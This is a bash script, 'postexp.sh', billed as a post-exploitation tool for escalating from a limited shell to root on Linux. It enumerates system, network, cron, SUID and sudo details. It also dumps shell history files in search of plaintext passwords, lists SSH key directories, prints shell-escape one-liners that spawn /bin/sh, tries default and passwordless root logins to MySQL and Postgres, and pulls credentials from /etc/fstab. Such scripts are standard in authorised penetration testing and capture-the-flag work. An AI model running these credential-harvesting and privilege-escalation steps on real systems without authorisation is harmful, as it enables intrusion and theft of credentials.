#!/bin/bash
# version 0.2

# Postexp tool is a tool to enumerate local informations such as network, system, service, application informations and more, from any Linux box that you find your self you have a limited privilege shell on it.
# it helps you finding your way to the root privilege.

# Changelogs
# Version 0.1
# it's the first time that we release our tool

# Version 0.2
# A new title - shell escape [./postexp -l]
# Editing the development tools as well as the way to extract version from applications/services

echo ""
echo ""
echo ""

# create variables
red=$'\e[0;31m'
white=$'\e[0m'
blu=$'\e[0;94m'
pur=$'\e[0;35m'
cyan=$'\e[0;96m'
boldred=$'\e[1;91m'
boldgrn=$'\e[1;92m'
yellowintensy=$'\e[0;93m'
grnintensy=$'\e[0;92m'
whiteboldintensy=$'\e[1;97m'

echo $red"############################################################################"$white
echo $red"#                                                                          #"$white	
echo $red"#                  $whiteboldintensy POST-EXPLOITATION TOOL$grnintensy by mbahadou$red                     #"$white
echo $red"#                                                                          #"$white
echo $red"############################################################################"$white

echo ""
echo ""
echo ""
function OperatingSystem(){
echo $boldgrn"[-] OPERATING SYSTEM"$white
echo $boldred"[+] - Check current user and group information"$white

ID=`id 2>/dev/null`
if [ "$ID" ];
then
	echo $yellowintensy"[x] Using id"$white
	echo -e "$ID\n"
else
	:
fi

WHOAMI=`whoami 2>/dev/null`
if [ "$WHOAMI" ];
then
	echo $yellowintensy"[x] Using whoami"$white
	echo -e "$WHOAMI"
else
	:
fi
echo ""

echo $boldred"[+] - Check distribution type and version number"$white

RELEASE=`cat /etc/*-release 2>/dev/null`
if [ "$RELEASE" ];
then
	echo $yellowintensy"[x] /etc/*-release"$white
	echo -e "$RELEASE"
else
	:
fi 
echo ""

echo $boldred"[+] - Check kernel version"$white
UNAME=`uname -a 2>/dev/null`
if [ "$UNAME" ];
then
	echo $yellowintensy"[x] Using uname -a"$white
	echo -e "$UNAME\n"
else
	:
fi
PROCVERSION=`cat /proc/version 2>/dev/null`
if [ "$PROCVERSIOM" ];
then
	echo $yellowintensy"[x] /proc/version"$white
	echo -e "$PROCVERSIOM"
else
	:
fi
echo ""
}

function AppsAndServices(){
echo $boldgrn"[-] APPS and SERVICES"$white
echo $boldred"[+] - Check jobs scheduled"$white

CRON=`ls -al /etc/ | grep cron 2>/dev/null`
if [ "$CRON" ];
then
	echo $yellowintensy"[x] /etc/ | grep cron"$white
	echo -e "$CRON\n"
	echo $yellowintensy"[x] Using crontab -l"$white
	crontab -l; echo ""
else
	:
fi

CRONDAILY=`ls -l /etc/cron.daily 2>/dev/null`
if [ "$CRONDAILY" ];
then
	echo $yellowintensy"[x] /etc/cron.daily"$white
	echo -e "$CRONDAILY\n"
else
	:
fi

CRONDHOURLY=`ls -l /etc/cron.hourly 2>/dev/null`
if [ "$CRONDHOURLY" ];
then
	echo $yellowintensy"[x] /etc/cron.hourly"$white
	echo -e "$CRONDHOURLY\n"
else
	:
fi 

CRONDMONTHLY=`ls -l /etc/cron.monthly 2>/dev/null`
if [ "$CRONDMONTHLY" ];
then
	echo $yellowintensy"[x] /etc/cron.monthly"$white
	echo -e "$CRONDMONTHLY"
else
	:
fi 
echo ""

echo $boldred"[+] - Check for running services, and which service(s) are been running by root"$white

AUX=`ps aux 2>/dev/null`
if [ "$AUX" ];
then
	echo $yellowintensy"[x] Dispaly every process on the system : ps aux"$white
	echo -e "$AUX\n"
else
	:
fi

AUXROOT=`ps aux | grep root 2>/dev/null`
if [ "$AUXROOT" ];
then
	echo $yellowintensy"[x] Display every process running by root on the system : ps aux | grep root"$white
	echo -e "$AUXROOT\n"
else
	:
fi

MYSQL=`ps aux | grep mysql 2>/dev/null`
if [ "$MYSQL" ];
then
	echo $yellowintensy"[x] Is mysql running by root : ps aux | grep mysql"$white
	echo -e "$MYSQL"
else
	:
fi
echo ""
}
function CommAndNet(){
echo $boldgrn"[-] COMMUNICATING and NETWORKING"$white
echo $boldred"[+] - Check NIC(s) does the system have"$white

IFCONFIG=`ifconfig -a 2>/dev/null`
if [ "$IFCONFIG" ];
then
	echo $yellowintensy"[x] Display all interfaces which are currently available : ifconfig -a"$white
	echo -e "$IFCONFIG\n"
else
	:
fi

INTERFACE=`cat /etc/network/interfaces 2>/dev/null`
if [ "$INTERFACE" ];
then
	echo $yellowintensy"[x] Available network interfaces on the system : /etc/network/interfaces"$white
	echo -e "$INTERFACE\n"
else
	:
fi

HOST=`cat /etc/hosts 2>/dev/null`
if [ "$HOST" ];
then
	echo $yellowintensy"[x] /etc/hosts"$white
	echo -e "$HOST"
else
	:
fi
echo ""

echo $boldred"[+] - Check network configuration settings"$white

RESOLV=`cat /etc/resolv.conf 2>/dev/null`
if [ "$RESOLV" ];
then
	echo $yellowintensy"[x] /etc/resolv.conf"$white
	echo -e "$RESOLV\n"
else
	:
fi

NETWORK=`cat /etc/networks 2>/dev/null`
if [ "$NETWORK" ];
then
	echo $yellowintensy"[x] /etc/networks"$white
	echo -e "$NETWORK\n"
else
	:
fi

IPTABLE=`iptables -L 2>/dev/null`
if [ "$IPTABLE" ];
then
	echo $yellowintensy"[x] Packet filter rules : iptables -L"$white
	echo -e "$IPTABLE\n"
else
	:
fi

HOSTNAME=`hostname 2>/dev/null`
if [ "$HOSTNAME" ];
then
	echo $yellowintensy"[x] Using Hostname"$white
	echo -e "$HOSTNAME\n"
else
	:
fi

DNS=`dnsdomainname 2>/dev/null`
if [ "$DNS" ];
then
	echo $yellowintensy"[x] Get DNS domain or the FQDN : dnsdomainname"$white
	echo -e "$DNS"
else
	:
fi

echo ""

echo $boldred"[+] - Check users and hosts communicating with the system"$white
NETSTAT=`netstat -antup 2>/dev/null`
if [ "$NETSTAT" ];
then
	echo $yellowintensy"[x] Display all TCP/UDP connected socket, PID/program : netstat -antup"$white
	echo -e "$NETSTAT\n"
else
	:
fi
LAST=`last 2>/dev/null`
if [ "$LAST" ];
then
	echo $yellowintensy"[x] Last logged in users : last"$white
	echo -e "$LAST\n"
else
	:
fi

W=`w 2>/dev/null`
if [ "$W" ];
then
	echo $yellowintensy"[x] Who is logged on and what they are doing : w"$white
	echo -e "$W"
else
	:
fi
echo ""

echo $boldred"[+] - Check cached IP and/or MAC addresses"$white
ARP=`arp -e 2>/dev/null`
if [ "$ARP" ];
then
	echo $yellowintensy"[x] Display all hosts : arp -e"$white
	echo -e "$ARP\n"
else
	:
fi

ROUTE=`route -nee 2>/dev/null`
if [ "$ROUTE" ];
then
	echo $yellowintensy"[x] Display IP routing table : route -nee"$white
	echo -e "$ROUTE" 
else
	:
fi
echo ""
}

function ConfidentialInfoAndUser(){
echo $boldgrn"[-] CONFIDENTIAL INFO and USER"$white
echo $boldred"[+] - Check list of users and super users"$white

SUPERUSER1=`awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null`
SUPERUSER2=`grep -v -E "^#" /etc/passwd 2>/dev/null | awk -F: '$3 ==0 { print $1}' 2>/dev/null`
if [ "$SUPERUSER" ] || [ "$SUPERUSER2" ];
then
	echo $yellowintensy"[x] Super user"$white
	echo -e "$SUPERUSER1"; echo -e "$SUPERUSER2\n"
else
	:
fi

HOMEUSERS=`for x in $(ls /home) ; do echo $x ; done`
if [ "$HOMEUSERS" ];
then
	echo $yellowintensy"[x] Useful home users"$white
	echo -e $cyan"$HOMEUSERS \n"$white
else
	:
fi

PASSWD=`cat /etc/passwd | grep "/bin/bash\|/bin/sh\|/bin/dash" 2>/dev/null`
if [ "$PASSWD" ];
then
	echo $yellowintensy"[x] Anything with /bin/bash /bin/sh /bin/dash : from /etc/passwd"$white
	echo -e "$PASSWD\n"
else
	:
fi

CHECKETC=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$CHECKETC" ];
then
	echo $yellowintensy"[x] All *.conf files in /etc (recursive 1 level)"$white
	echo -e "$CHECKETC\n"
else
	:
fi

MASTERPASS=`cat /etc/master.passwd 2>/dev/null`
if [ "$MASTERPASS" ];
then
	echo $yellowintensy"[x] Master passwd from /etc/master.passwd"$white
	echo $cyan"/etc/master.passwd"$white
	echo -e "$MASTERPASS\n"
else
	:
fi
echo ""

SUDOPASS=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$SUDOPASS" ];
then
	echo $yellowintensy"[x] Sudo permissions"$white
	echo $cyan"[/] We can run sudo without supplying a password"$white
	echo -e "\n$SUDOPASS\n"
else
	:
fi

echo $boldred"[+] - Check sensitive files"$white

WRPASS=`ls -l /etc/passwd 2>/dev/null`
if [ -w /etc/passwd ];
then
	echo -e "$cyan$WRPASS $white"
else
	ls -l /etc/passwd 2>/dev/null
fi

WXSHADOW=`ls -l /etc/shadow 2>/dev/null`
if [ -w /etc/shadow ] || [ -r /etc/shadow ];
then
	echo -e "$cyan$WXSHADOW $white"
else
	ls -l /etc/shadow 2>/dev/null
fi

WRGROUP=`ls -l /etc/passwd 2>/dev/null`
if [ -w /etc/group ]; 
then
	echo -e "$cyan$WRGROUP $white"
else
	ls -l /etc/group 2>/dev/null
fi

WRSUDOERS=`ls -l /etc/sudoers 2>/dev/null`
if [ -w /etc/sudoers ] || [ -r /etc/sudoers ];
then
	echo -e "$cyan$WRSUDOERS $white"
else
	ls -l /etc/sudoers 2>/dev/null
fi
echo ""
MAILVAR=`ls -alh /var/mail 2>/dev/null`
if [ "$MAILVAR" ];
then 
	echo $yellowintensy"[x] Using ls -alh /var/mail"$white
	echo -e "$MAILVAR\n"
else
	:
fi

ROOTMAIL=`ls -l /var/mail/root 2>/dev/null`
if [ -e /var/mail/root ] && [ -r /var/mail/root ];
then
	echo $yellowintensy"[x] Using ls -l /var/mail/root"$white
	echo -e $cyan"$ROOTMAIL"$white
else
	:
fi
echo ""

echo $boldred"[+] - Check if anything interesting in the home directories"$white
ROOTDIR=`ls -ahl /root/ 2>/dev/null`
if [ "$ROOTDIR" ];
then
	echo $yellowintensy"[x] Using ls -alh /root"$white
	echo $cyan"[/] Root directory can be accessible"$white
	echo -e "\n$ROOTDIR\n"
else
	:
fi

HOMEDIR=`ls -lh /home/ 2>/dev/null`
if [ "$HOMEDIR" ];
then
	echo $yellowintensy"[x] Using ls -lh /home"$white
	echo -e $cyan"$HOMEDIR\n"$white
else
	:
fi

HOMEHISTORY=`ls -lah /home/*/.*_history 2>/dev/null`

if [ "$HOMEHISTORY" ];
then
	echo $yellowintensy"[x] /home history files"$white
	echo $cyan"$HOMEHISTORY"$white
else
	:
fi
echo ""

ROOTHISTORY=`ls -lah /root/.*_history 2>/dev/null`
if [ "$ROOTHISTORY" ];
then
	echo $yellowintensy"[x] /root history files"$white
	echo $cyan"$ROOTHISTORY"$white
else
	:
fi
echo ""
echo $boldred"[+] - Check for plain text password"$white
if [ -e ~/.bash_history ];
then
	echo $yellowintensy"[x] ~/.bash_history"$white
	cat ~/.bash_history ; echo ""
else
	echo $blu"~/.bash_history file doesn't exist"$white
fi
if [ -e ~/.nano_history ];
then
	echo $yellowintensy"[x] ~/.nano_history"$white
	cat ~/.nano_history ; echo ""
else
	echo $blu"~/.nano_history file doesn't exist"$white
fi

if [ -e ~/.mysql_history ];
then
	echo $yellowintensy"[x] ~/.mysql_history"$white
	cat ~/.mysql_history ; echo ""
else
	echo $blu"~/.mysql_history file doesn't exist"$white
fi
if [ -e ~/.php_history ];
then
	echo $yellowintensy"[x] ~/.php_history"$white
	cat ~/.php_history ; echo ""
else
	echo $blu"~/.php_history file doesn't exist"$white ; echo ""
fi

if [ -d /home/*/.ssh ];
then
	if [ -r /home/*/.ssh ];
	then
		echo $yellowintensy"[x] Any private-key info - /home/*/.ssh/"$white
		LISTSSHHOME=`ls -ld /home/*/.ssh/`
		echo -e "$cyan$LISTSSHHOME [READABLE] $white\n"
		ls -alh /home/*/.ssh
	else
		echo $yellowintensy"[x] Any private-key info - /home/*/.ssh/"$white
		LISTSSHHOME=`ls -ld /home/*/.ssh/`
		echo -e "$cyan$LISTSSHHOME $white\n"
	fi
else
	echo $yellowintensy"[x] Any private-key info - /home/*/.ssh/"$white
	echo $blu"~/.ssh/ folder doesn't exist"$white
	echo ""
fi

if [ -d /root/.ssh ];
then
	if [ -r /root/.ssh ];
	then
		echo $yellowintensy"[x] Any private-key info - /root/.ssh/"$white
		LISTSSHROOT=`ls -ld /root/.ssh/`
		echo -e "$cyan$LISTSSHROOT [READABLE] $white\n"
		ls -alh /root/.ssh/
	else
		echo $yellowintensy"[x] Any private-key info - /root/.ssh/"$white
		LISTSSHROOT=`ls -ld /root/.ssh/`
		echo -e "$cyan$LISTSSHROOT $white\n"
	fi
else
	echo $yellowintensy"[x] Any private-key info - /root/.ssh/"$white
	echo $blu"/root/.ssh/ folder doesn't exist"$white
	echo ""
fi
ROOTLOGIN=`grep "PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print $2}'`
if [ "$ROOTLOGIN" ];
then
	echo $cyan"[/] Root is allowed to login via SSH"$white
	echo -e "$ROOTLOGIN"
else
	:
fi
echo ""
echo $boldred"[+] - Check password policy information"$white
LOGINDEFS=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`

if [ "$LOGINDEFS" ];
then
	echo $yellowintensy"[x] From /etc/login/defs"$white
	echo -e "$LOGINDEFS"
else
	:
fi
echo ""


}

function FileSystem(){
echo $boldgrn"[-] FILE SYSTEM"$white
echo $boldred"[+] - Check for any settings file database information"$white

VAR=`ls -alh /var 2>/dev/null`
if [ "$VAR" ];
then
	echo $yellowintensy"[x] Using ls -alh /var"$white
	echo -e "$VAR\n"
else
	:
fi

WWW=`ls -alh /var/www 2>/dev/null`
if [ "$WWW" ];
then
	echo $yellowintensy"[x] Using ls -alh /var/www"$white
	echo -e "$WWW\n" 
else
	:
fi

HTML=`ls -alh /var/www/html 2>/dev/null`
if [ "$HTML" ];
then
	echo $yellowintensy"[x] Using ls -alh /var/www/html"$white
	echo -e "$HTML"
else
	:
fi
echo ""

SUID=`find / -perm -u=s -type f 2>/dev/null`
echo $boldred"[+] - Check sticky bits, SUID and GUID"$white
if [ "$SUID" ];
then
	echo $yellowintensy"[x] SUID - 4000"$white
	echo -e "$SUID" #SUID (chmod 4000) - run as the owner, not the user who started it.

else
	:
fi
echo ""
SGID=`find / -perm -g=s -type f 2>/dev/null`
if [ "$SGID" ];
then
	echo $yellowintensy"[x] SGID - 2000"$white
	echo -e "$SGID"  # SGID (chmod 2000) - run as the group, not the user who started it.
else
	:
fi
echo ""
STICKY=`find / -perm -1000 -type d 2>/dev/null`
if [ "$STICKY" ];
then
	echo $yellowintensy"[x] Sticky bit for folder - 1000"$white
	echo -e "$STICKY\n"  # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
else
	:
fi

echo $boldred"[+] - Check for written and executable places"$white

WRITEABLE=`find / -perm -222 -type d 2>/dev/null`
if [ "$WRITEABLE" ];
then
	echo $yellowintensy"[x] World-writeable folder"$white
	echo -e "$WRITEABLE\n"     # world-writeable folders
else
	:
fi

EXECUTABLE=`find / -perm -o x -type d 2>/dev/null`
if [ "$EXECUTABLE" ];
then
	echo $yellowintensy"[x] World-executable folder"$white
	echo -e "$EXECUTABLE"   # world-executable folders
else
	:
fi
echo ""
}

function DevToolsAndLang(){
echo $boldgrn"[-] DEVELOPMENT TOOLS and LANGUAGES"$white
echo $boldred"[+] - Check for development tools and languages are installed/supported"$white
PYTHON=`which python 2>/dev/null`
if [ "$PYTHON" ];
then
	echo -e "$PYTHON"
else
	:
fi

PYTHON3=`which python3 2>/dev/null`
if [ "$PYTHON3" ];
then
	echo -e "$PYTHON3"
else
	:
fi

PERL=`which perl 2>/dev/null`
if [ "$PERL" ];
then
	echo -e "$PERL"
else
	:
fi

PHP=`which php 2>/dev/null`
if [ "$PHP" ];
then
	echo -e "$PHP"
else
	:
fi

GCC=`which gcc 2>/dev/null`
if [ "$GCC" ];
then
	echo -e "$GCC"
else
	:
fi

CC=`which cc 2>/dev/null`
if [ "$CC" ];
then
	echo -e "$CC"
else
	:
fi
NMAP=`which nmap 2>/dev/null`
if [ "$NMAP" ];
then
	echo -e "$NMAP"
else
	:
fi
echo ""

echo $boldred"[+] - Check for how files can be uploaded"$white

FTP=`which ftp 2>/dev/null`
if [ "$FTP" ];
then
	echo -e "$FTP"
else
	:
fi

TFTP=`which tftp 2>/dev/null`
if [ "$TFTP" ];
then
	echo -e "$TFTP"
else
	:
fi

NETCAT=`which netcat 2>/dev/null`
if [ "$NETCAT" ];
then
	echo -e "$NETCAT"
else
	:
fi

NC=`which nc 2>/dev/null`
if [ "$NC" ];
then
	echo -e "$NC"
else
	:
fi

WGET=`which wget 2>/dev/null`
if [ "$WGET" ];
then
	echo -e "$WGET"
else
	:
fi

CURL=`which curl 2>/dev/null`
if [ "$CURL" ];
then
	echo -e "$CURL"
else
	:
fi
echo ""

echo $boldred"[+] - Shell escape"$white
echo "awk    =	awk 'BEGIN {system(\"/bin/sh\")}'"
echo "perl   =	perl -e 'exec \"/bin/sh\";'"
echo "python = 	python -c 'import pty;pty.spawn(\"/bin/sh\")'"
echo "php    =	php -r 'system(\"/bin/sh\");'"
echo "ruby   =	ruby -e 'exec \"/bin/sh\"'"
echo "less   =	!sh"
echo "more   =	!sh"
echo "nmap   =	--interactive"
echo "find   =	find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
echo "find   =	find / -exec sh -i \;"
echo "vi     =	:!sh or :shell"
echo "vim    =	:!sh or :shell"
echo ""
}


function SoftwareVersion(){
echo $boldgrn"[-] SOFTWARE VERSION"$white
echo $boldred"[+] - Check apps and services version"$white

SUDOVER=`sudo -V | grep version | grep "Sudo " 2>/dev/null`
if [ "$SUDOVER" ];
then
	echo $yellowintensy"[x] Sudo version"$white
	echo -e "$SUDOVER\n"
else
	:
fi

MYSQLVER=`mysql -V 2>/dev/null`
if [ "$MYSQLVER" ];
then
	echo $yellowintensy"[x] MYSQL version"$white
	echo -e "$MYSQLVER\n"
else
	:
fi

PSQL=`psql -V 2>/dev/null`
if [ "$PSQL" ];
then
	echo $yellowintensy"[x] PostgreSQL version"$white
	echo -e "$PSQL\n"
else
	:
fi

APACHEVER=`apache2 -v 2>/dev/null`
if [ "$APACHEVER" ];
then
	echo $yellowintensy"[x] Apache version"$white
	echo -e "$APACHEVER\n"
else
	:
fi

APACHEUSER=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null | awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$APACHEUSER" ];
then
	echo $yellowintensy"[x] Account running under apache service"$white
	echo -e "$APACHEUSER\n"
else
	:
fi

echo $yellowintensy"[x] Check for chkrootkit version"$white
CHKROOTKIT=`echo '' | grep version $(chkrootkit -V) 2>/dev/null`
if [ "$CHKROOTKIT" ];
then
	echo $yellowintensy"[x] Chkrootkit version"$white
	echo -e "$CHKROOTKIT"
else
	:
fi
echo ""


}

function TryingAccess(){
echo $boldgrn"[-] TRYING ACCESS"$white
echo $boldred"[+] - Check for some methods for extract creds and get access as root"$white

#thanks to LinEnum.sh
MYSQLCONNECT=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$MYSQLCONNECT" ];
then
	echo $yellowintensy"[x] Connect to MYSQL with root/root creds"$white
	echo -e "$cyan[/] We can connect to the local MYSQL service with default root/root credentials!$white\n$MYSQLCONNECT" 
       	echo -e "\n" 
else 
  	:
fi

MYSQLCONNECTNOPASS=`mysqladmin -uroot version 2>/dev/null`
if [ "$MYSQLCONNECTNOPASS" ];
then
	echo $yellowintensy"[x] Connect to MYSQL as root and non-pass"$white
  	echo -e "$cyan[/] We can connect to the local MYSQL service as 'root' and without a password!$white\n$MYSQLCONNECTNOPASS" 
  	echo -e "\n" 
else 
  	:
fi


POSTCON1=`psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$POSTCON1" ];
then
	echo $yellowintensy"[x] Connect to Postgres DB 'template0' as user postgres and non-pass"$white
	 echo -e "$cyan[/] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:$white\n$POSTCON1" 
 	 echo -e "\n" 
else 
  	:
fi

POSTCON11=`psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$POSTCON11" ];
then
	echo $yellowintensy"[x] Connect to Postgres DB 'template1' as user postgres and non-pass"$white
	echo -e "$cyan[/] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:$white\n$POSTCON11" 
  	echo -e "\n" 
else 
  	:
fi

POSTCON2=`psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$POSTCON2" ];
then
	echo $yellowintensy"[x] Connect to Postgres DB 'template0' as user psql and non-pass"$white
	echo -e "$cyan[/] We can connect to Postgres DB 'template0' as user 'psql' with no password!:$white\n$POSTCON2" 
	echo -e "\n" 
else 
  	:
fi

POSTCON22=`psql -U pgsql template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$POSTCON22" ];
then
	echo $yellowintensy"[x] Connect to Postgres DB 'template1' as user psql and non-pass"$white
	echo -e "$cyan[/] We can connect to Postgres DB 'template1' as user 'psql' with no password!:$white\n$POSTCON22" 
	echo -e "\n" 
else 
  	:
fi

#looking for credentials in /etc/fstab
FSTAB=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$FSTAB" ];
then
	echo $yellowintensy"[x] Any creds in /etc/fstab"$white
	echo -e "$cyan[/] Looks like there are credentials in /etc/fstab!$white\n$FSTAB"
	echo -e "\n"
else 
  	:
fi

FSTABCRED=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$FSTABCRED" ];
then
	echo $yellowintensy"[x] Any creds file in /etc/fstab"$white
	echo -e "$cyan[/] /etc/fstab contains a credentials file!$white\n$FSTABCRED" 
	echo -e "\n" 
else
	:
fi

}

function Usage(){
echo $boldgrn"Usage : ./postexp.sh <option>"$white; echo ""
echo " Options :"
echo "	-a :	all"
echo "	-s :	filesystem [SUID, SGID..]"
echo "	-l :	shell escape and development tools"
echo "	-c :	the most interesting files"
echo "	-n :	network settings"
echo "	-p :	services and cron.."
echo "	-o :	operating system informations"
echo "	-v :	sofware versions"
echo "	-t :	extract creds and get access as root to dbs"
echo ""
}

OPTIONS="$1"
if [ "$OPTIONS" == "" ];
then
	Usage
else
	if [ "$OPTIONS" == "-a" ];
	then
		OperatingSystem
		AppsAndServices
		CommAndNet
		SoftwareVersion
		ConfidentialInfoAndUser
		FileSystem
		DevToolsAndLang
		TryingAccess
	else
		if [ "$OPTIONS" == "-s" ];
		then
			FileSystem
		else
			if [ "$OPTIONS" == "-l" ];
			then
				DevToolsAndLang
			else
				if [ "$OPTIONS" == "-c" ];
				then
					ConfidentialInfoAndUser
				else
					if [ "$OPTIONS" == "-n" ];
					then
						CommAndNet
					else
						if [ "$OPTIONS" == "-p" ];
						then
							AppsAndServices
						else
							if [ "$OPTIONS" == "-o" ];
							then
								OperatingSystem
							else
								if [ "$OPTIONS" == "-v" ];
								then
									SoftwareVersion
								else
									if [ "$OPTIONS" == "-t" ];
									then
										TryingAccess
									else
										Usage
									fi
								fi
							fi
						fi
					fi
				fi
			fi
		fi	
	fi
fi

